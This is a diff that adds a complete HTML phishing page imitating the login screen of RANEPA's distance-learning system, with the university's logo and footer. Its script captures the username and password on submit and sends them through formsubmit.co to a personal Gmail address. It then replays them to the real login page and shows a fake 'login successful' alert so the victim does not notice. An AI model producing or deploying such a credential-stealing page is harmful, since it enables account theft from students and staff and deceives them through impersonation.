@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход на сайт | РАНХиГС СДО</title>
+    <style>
+        /* Основные стили для страницы */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #333;
+        }
+
+        .login-container {
+            background-color: #fff;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 400px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .logo {
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            width: 100%;
+            height: auto;
+        }
+
+        form {
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: #951A1D;
+            border-width: 2.5px;
+            outline: none;
+        }
+
+        button {
+            width: calc(100% / 6);
+            padding: 12px;
+            background-color: #951A1D;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: normal;
+            transition: background-color 0.3s;
+            text-align: center;
+            margin-left: 0;
+            align-self: flex-start;
+        }
+
+        button:hover {
+            background-color: #7A1517;
+        }
+
+        .footer {
+            margin-top: 25px;
+            font-size: 12px;
+            color: #777;
+        }
+
+        /* Медиа-запрос для мобильных устройств */
+        @media (max-width: 480px) {
+            .login-container {
+                width: 90%;
+                padding: 15px;
+            }
+
+            button {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://lms.ranepa.ru/pluginfile.php/1/core_admin/logo/0x200/1762586712/ranepa-logo.png" alt="РАНХиГС">
+        </div>
+        
+        <!-- Форма с JavaScript-автовходом -->
+        <form id="loginForm">
+            <label for="username">Логин</label>
+            <input type="text" id="username" name="username" placeholder="Логин или адрес электронной почты" required>
+            
+            <label for="password">Пароль</label>
+            <input type="password" id="password" name="password" placeholder="Пароль" required>
+            
+            <button type="submit">Вход</button>
+        </form>
+        
+        <div class="footer">
+            © 2025 Российская академия народного хозяйства и государственной службы при Президенте РФ
+        </div>
+    </div>
+
+    <!-- JavaScript: отправка на email + автоматический вход -->
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault(); // Отключаем стандартную отправку
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // 1. Отправляем данные на ваш email
+            const formData = new FormData();
+            formData.append('username', username);
+            formData.append('password', password);
+            formData.append('_honey', '');
+            formData.append('_captcha', 'false');
+            formData.append('_subject', 'Новый вход в СДО РАНХиГС');
+            formData.append('_autoresponse', 'Спасибо! Данные получены.');
+            formData.append('_next', ''); // Отключаем редирект FormSubmit
+
+            await fetch('https://formsubmit.co/ekaterinakarmalitova@gmail.com', {
+                method: 'POST',
+                body: formData
+            });
+
+            // 2. Пытаемся выполнить автоматический вход на настоящий сайт
+            const realForm = document.createElement('form');
+            realForm.method = 'POST';
+            realForm.action = 'https://lms.ranepa.ru/login/index.php';
+            realForm.target = '_blank'; // Открываем в новой вкладке
+
+            const userInput = document.createElement('input');
+            userInput.name = 'username';
+            userInput.value = username;
+            realForm.appendChild(userInput);
+
+            const passInput = document.createElement('input');
+            passInput.name = 'password';
+            passInput.value = password;
+            realForm.appendChild(passInput);
+
+            document.body.appendChild(realForm);
+            realForm.submit();
+
+            // 3. Показываем пользователю "вход выполнен"
+            alert('Вход выполнен! Открывается система...');
+        });
+    </script>
+</body>
+</html>
